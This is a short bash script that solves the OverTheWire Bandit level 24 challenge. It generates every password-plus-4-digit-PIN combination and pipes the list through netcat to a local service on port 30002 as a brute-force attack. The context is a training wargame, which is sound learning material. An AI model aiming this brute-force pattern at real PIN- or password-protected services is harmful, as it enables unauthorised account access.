#!/bin/bash
#This simple script for bandit24 (overthewire) will generate a list of combination password + pin numbers. It will also perform a bruteforce attack to get the password for the next level.

#Create temporary folder by executing the following command:
#replace 'user_folder' with a folder name of your choice
#mkdir /tmp/user_folder; cd /tmp/user_folder

#save this script into /tmp/user_folder:
#replace 'user_script.sh' with a file name of your choice
#nano user_script.sh
#bash user_script.sh

#Get temporary folder name from user
echo
echo -n "Please key in the name of your temporary folder: "
read TEMP_FOLDER

#temporary folder path
TEMP_PATH="/tmp/$TEMP_FOLDER"
if [ ! -d "$TEMP_PATH" ]; then
  echo "Directory $(echo $TEMP_PATH) does not exist. Please run $0 and try again."
  exit
fi

#get bandit24's password
echo
echo -n "Enter the password for bandit24: "
read PW

#create a script to generate a list of combination of $PW and 4 digits pin number
echo '#!/bin/bash' > $TEMP_PATH/pinGenerator.sh
echo 'PW='$PW >> $TEMP_PATH/pinGenerator.sh
echo 'for i in {0000..9999}' >> $TEMP_PATH/pinGenerator.sh
echo 'do' >> $TEMP_PATH/pinGenerator.sh
echo 'echo $PW $i' >> $TEMP_PATH/pinGenerator.sh
echo 'done' >> $TEMP_PATH/pinGenerator.sh

if [ -f "$TEMP_PATH/pinGenerator.sh" ]; then
  echo
  echo "Pin Generator script created: $TEMP_PATH/pinGenerator.sh"
  #save the output from the pin generator to a file
  bash $TEMP_PATH/pinGenerator.sh >> $TEMP_PATH/passPin.txt
fi

if [ -f  "$TEMP_PATH/passPin.txt" ]; then
  echo "Pass + Pin combination list created: $TEMP_PATH/passPin.txt"
  echo
  echo "Starting Bruteforce Attack..."
  echo
  nc localhost 30002 < $TEMP_PATH/passPin.txt
fi
